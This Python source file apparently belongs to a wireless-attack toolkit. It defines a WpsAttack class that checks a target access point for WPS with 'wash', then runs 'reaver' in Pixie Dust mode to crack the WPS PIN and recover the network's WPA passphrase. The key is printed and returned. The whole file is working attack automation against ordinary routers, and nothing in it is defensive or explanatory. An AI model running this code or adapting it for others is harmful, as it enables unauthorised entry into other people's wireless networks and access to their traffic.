import src.attacks.WirelessAttack as WirelessAttack
import src.settings as settings
import poormanslogging as log
import pexpect
import os


class WpsAttack(WirelessAttack):
	def check(self, bssid):
		c = pexpect.spawn('wash -i {i}'.format(i=self.interface))
		c.logfile = open(settings.LOG_FILE, 'wb')
		c.expect([bssid, pexpect.TIMEOUT, pexpect.EOF], settings.WASH_SCAN_TIME)
		c.close()
		with open(settings.LOG_FILE, 'r') as f:
			l = f.readlines()
			found = list(filter(lambda x: bssid in x, l))
			os.remove(settings.LOG_FILE)
			return len(found) > 0

	def perform(self, channel, bssid):
		def scan_logfile(pattern):
			with open(settings.LOG_FILE, 'r') as f:
				l = f.readlines()
				found = list(filter(lambda x: pattern in x, l))
				if len(found) > 0:
					return found[0]

		c = pexpect.spawn('reaver -i {0} -c {1} -b {2} -s n -K 1 -vv'.format(settings.INTERFACE, channel, bssid))
		c.logfile = open(settings.LOG_FILE, 'wb')
		ret = c.expect(['WPA PSK: ', 'WPS pin not found!', pexpect.TIMEOUT], settings.REAVER_TIMEOUT)
		c.close()
		if ret == 0:
			log.info("Passkey found!")
			results = scan_logfile("WPA PSK: ")
			os.remove(settings.LOG_FILE)
			print(results)
			return results
		elif ret == 1:
			log.warn("Passkey for {b} not found...".format(b=bssid))
		else:
			# timed out, probably. Just check the logfile?
			log.warn("Not sure if we found the key. You might want to check the file: {f}".format(f=settings.LOG_FILE))
